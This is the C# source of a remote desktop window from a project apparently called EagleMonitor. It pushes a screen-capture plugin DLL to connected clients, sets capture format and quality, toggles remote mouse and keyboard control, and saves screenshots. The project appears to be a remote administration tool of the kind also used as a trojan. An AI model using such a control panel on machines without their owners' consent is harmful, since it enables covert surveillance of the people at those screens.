using EagleMonitor.Controls;
using EagleMonitor.Networking;
using PacketLib;
using PacketLib.Packet;
using System;
using System.IO;
using System.Threading;
using System.Windows.Forms;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace EagleMonitor.Forms
{
    public partial class RemoteDesktopForm : FormPattern
    {
        internal ClientHandler clientHandler { get; set; }
        public bool hasAlreadyConnected { get; set; }
        private string baseIp { get; set; }
        private int currentPanelHeight { get; set; }
        internal bool enabledMouse { get; set; }
        internal bool enableKeyboard { get; set; }
        internal RemoteDesktopForm(string baseIp)
        {
            this.baseIp = baseIp;
            InitializeComponent();
            this.currentPanelHeight = panel1.Height;
        }
      
        private void captureGuna2ToggleSwitch_CheckedChanged(object sender, EventArgs e)
        {
            if (int.TryParse(intervalGuna2TextBox.Text, out int interval) && captureGuna2ToggleSwitch.Checked)
            {
                RemoteViewerPacket remoteViewerPacket = new RemoteViewerPacket(PacketType.RM_VIEW_ON);

                remoteViewerPacket.plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\RemoteDesktop.dll"), 1);
                remoteViewerPacket.baseIp = this.baseIp;
                remoteViewerPacket.width = viewerPictureBox.Width;
                remoteViewerPacket.height = viewerPictureBox.Height;
                remoteViewerPacket.format = formatGuna2ComboBox.Text;
                remoteViewerPacket.quality = qualityGuna2TrackBar.Value;
                remoteViewerPacket.timeMS = interval;

                this.loadingCircle1.Visible = true;
                this.loadingCircle1.Active = true;

                ClientHandler.ClientHandlersList[baseIp].SendPacket(remoteViewerPacket);
            }
            else 
            {
                this.loadingCircle1.Visible = false;
                this.loadingCircle1.Active = false;

                RemoteViewerPacket remoteViewerPacket = new RemoteViewerPacket(PacketType.RM_VIEW_OFF);
                remoteViewerPacket.baseIp = this.baseIp;
                this.clientHandler.SendPacket(remoteViewerPacket);
            }
        }

        private void mouseGuna2ToggleSwitch_CheckedChanged(object sender, EventArgs e)
        {
            if (mouseGuna2ToggleSwitch.Checked)
                this.enabledMouse = true;
            else
                this.enabledMouse = false;
        }

        private void keyboardGuna2ToggleSwitch_CheckedChanged(object sender, EventArgs e)
        {
            if (keyboardGuna2ToggleSwitch.Checked)
                this.enableKeyboard = true;
            else
                this.enableKeyboard = false;
        }

        private void qualityGuna2TrackBar_ValueChanged(object sender, EventArgs e)
        {
            if (int.TryParse(intervalGuna2TextBox.Text, out int interval) && captureGuna2ToggleSwitch.Checked)
            {
                RemoteViewerPacket remoteViewerPacket = new RemoteViewerPacket(PacketType.RM_VIEW_ON);

                remoteViewerPacket.plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\RemoteDesktop.dll"), 1);
                remoteViewerPacket.baseIp = this.baseIp;
                remoteViewerPacket.width = viewerPictureBox.Width;
                remoteViewerPacket.height = viewerPictureBox.Height;
                remoteViewerPacket.format = formatGuna2ComboBox.Text;
                remoteViewerPacket.quality = qualityGuna2TrackBar.Value;
                remoteViewerPacket.timeMS = interval;

                this.clientHandler.SendPacket(remoteViewerPacket);
            }
        }

        private void viewerPictureBox_SizeChanged(object sender, EventArgs e)
        {
            if (int.TryParse(intervalGuna2TextBox.Text, out int interval) && captureGuna2ToggleSwitch.Checked)
            {
                RemoteViewerPacket remoteViewerPacket = new RemoteViewerPacket(PacketType.RM_VIEW_ON);

                remoteViewerPacket.plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\RemoteDesktop.dll"), 1);
                remoteViewerPacket.baseIp = this.baseIp;
                remoteViewerPacket.width = viewerPictureBox.Width;
                remoteViewerPacket.height = viewerPictureBox.Height;
                remoteViewerPacket.format = formatGuna2ComboBox.Text;
                remoteViewerPacket.quality = qualityGuna2TrackBar.Value;
                remoteViewerPacket.timeMS = interval;

                this.clientHandler.SendPacket(remoteViewerPacket);
            }
        }

        private void formatGuna2ComboBox_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (int.TryParse(intervalGuna2TextBox.Text, out int interval) && captureGuna2ToggleSwitch.Checked)
            {
                if(formatGuna2ComboBox.Text == "PNG" || formatGuna2ComboBox.Text == "GIF")
                    qualityGuna2TrackBar.Enabled = false;
                else
                    qualityGuna2TrackBar.Enabled = true;

                RemoteViewerPacket remoteViewerPacket = new RemoteViewerPacket(PacketType.RM_VIEW_ON);

                remoteViewerPacket.baseIp = this.baseIp;
                remoteViewerPacket.plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\RemoteDesktop.dll"), 1);
                remoteViewerPacket.width = viewerPictureBox.Width;
                remoteViewerPacket.height = viewerPictureBox.Height;
                remoteViewerPacket.format = formatGuna2ComboBox.Text;
                remoteViewerPacket.quality = qualityGuna2TrackBar.Value;
                remoteViewerPacket.timeMS = interval;

                this.clientHandler.SendPacket(remoteViewerPacket);
            }
        }

        private void intervalGuna2TextBox_TextChanged(object sender, EventArgs e)
        {
            if (int.TryParse(intervalGuna2TextBox.Text, out int interval) && captureGuna2ToggleSwitch.Checked) 
            {
                RemoteViewerPacket remoteViewerPacket = new RemoteViewerPacket(PacketType.RM_VIEW_ON);

                remoteViewerPacket.baseIp = this.baseIp;
                remoteViewerPacket.plugin = Compressor.QuickLZ.Compress(File.ReadAllBytes(Utils.Miscellaneous.GPath + "\\Plugins\\RemoteDesktop.dll"), 1);
                remoteViewerPacket.width = viewerPictureBox.Width;
                remoteViewerPacket.height = viewerPictureBox.Height;
                remoteViewerPacket.format = formatGuna2ComboBox.Text;
                remoteViewerPacket.quality = qualityGuna2TrackBar.Value;
                remoteViewerPacket.timeMS = interval;

                this.clientHandler.SendPacket(remoteViewerPacket);
            }
        }


        private void viewerPictureBox_MouseDown(object sender, MouseEventArgs e)
        {

        }

        private void viewerPictureBox_MouseMove(object sender, MouseEventArgs e)
        {

        }

        private void viewerPictureBox_MouseUp(object sender, MouseEventArgs e)
        {

        }


        private void hidePanelToolStripMenuItem_Click(object sender, EventArgs e)
        {
            new Thread(() =>
            {
                while (panel1.Height > panel2.Height)
                {
                    panel1.Height -= 2;
                    Thread.Sleep(10);
                }
            }).Start();
        }

        private void showPanelToolStripMenuItem_Click(object sender, EventArgs e)
        {
            new Thread(() =>
            {
                while (currentPanelHeight > panel1.Height)
                {
                    panel1.Height += 2;
                    Thread.Sleep(10);
                }
            }).Start();
        }

        private void saveCurrentPcitureToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (Directory.Exists(ClientHandler.ClientHandlersList[baseIp].clientPath + "\\" + "Screenshots") == false)
                Directory.CreateDirectory(ClientHandler.ClientHandlersList[baseIp].clientPath + "\\" + "Screenshots");

            string Date = DateTime.UtcNow.DayOfYear.ToString() + DateTime.UtcNow.Hour.ToString() + DateTime.UtcNow.Minute.ToString() + DateTime.UtcNow.Second.ToString() + DateTime.UtcNow.Millisecond.ToString();

            File.WriteAllBytes(ClientHandler.ClientHandlersList[baseIp].clientPath + "\\" + "Screenshots\\" + Date + "." + this.formatGuna2ComboBox.Text.ToLower(), PacketLib.Utils.ImageProcessing.ImageToBytes(this.viewerPictureBox.Image));
        }

        private void closeButton_Click(object sender, EventArgs e)
        {
            if (captureGuna2ToggleSwitch.Checked)
            {
                RemoteViewerPacket remoteViewerPacket = new RemoteViewerPacket(PacketType.RM_VIEW_OFF);
                remoteViewerPacket.baseIp = this.baseIp;
                this.clientHandler.SendPacket(remoteViewerPacket);
            }

            this.Close();
        }

        private void maximizeButton_Click(object sender, EventArgs e)
        {
            if (this.WindowState == FormWindowState.Normal)
            {
                this.WindowState = FormWindowState.Maximized;
            }
            else
            {
                this.WindowState = FormWindowState.Normal;
            }
        }

        private void minimizeButton_Click(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Minimized;
        }

        private void label3_MouseDown(object sender, MouseEventArgs e)
        {
            ReleaseCapture();
            SendMessage(this.FindForm().Handle, 161, 2, 0);
        }
    }
}
